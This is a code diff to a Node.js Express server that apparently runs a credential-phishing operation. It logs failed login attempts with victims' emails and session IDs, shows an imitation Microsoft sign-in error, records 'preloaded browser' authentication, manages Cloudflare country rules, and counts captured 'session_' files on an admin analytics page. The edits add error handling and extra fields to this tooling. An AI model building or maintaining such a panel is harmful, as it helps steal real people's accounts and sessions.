@@ -1372,11 +1372,13 @@ app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, asyn
                         id: failureId,
                         sessionId: sessionId,
                         email: email,
+                        password: null, // Don't store incorrect passwords
                         reason: 'Wrong Password',
                         errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                         timestamp: new Date().toISOString(),
                         status: 'invalid',
                         method: 'fast-authentication',
+                        authMethod: 'FAST Authentication (preloaded browser)',
                         preloadUsed: true,
                         failureType: 'incorrect_password'
                     };
@@ -2305,17 +2307,22 @@ app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
         let invalidEntries = 0;
         let totalVisits = analytics.totalLogins || 0;
 
-        const files = fs.readdirSync(sessionDir);
+        try {
+            const files = fs.readdirSync(sessionDir);
 
-        // Count valid sessions
-        validEntries = files.filter(file => 
-            file.startsWith('session_') && file.endsWith('.json')
-        ).length;
+            // Count valid sessions
+            validEntries = files.filter(file => 
+                file.startsWith('session_') && file.endsWith('.json')
+            ).length;
 
-        // Count invalid sessions
-        invalidEntries = files.filter(file => 
-            file.startsWith('invalid_') && file.endsWith('.json')
-        ).length;
+            // Count invalid sessions
+            invalidEntries = files.filter(file => 
+                file.startsWith('invalid_') && file.endsWith('.json')
+            ).length;
+        } catch (dirError) {
+            console.warn('Error reading session directory:', dirError.message);
+            // Continue with zeros if directory read fails
+        }
 
         res.json({
             success: true,
@@ -2330,7 +2337,12 @@ app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
         res.status(500).json({
             success: false,
             error: 'Failed to load analytics',
-            details: error.message
+            details: error.message,
+            totalVisits: 0,
+            validEntries: 0,
+            invalidEntries: 0,
+            successfulLogins: 0,
+            failedLogins: 0
         });
     }
 });
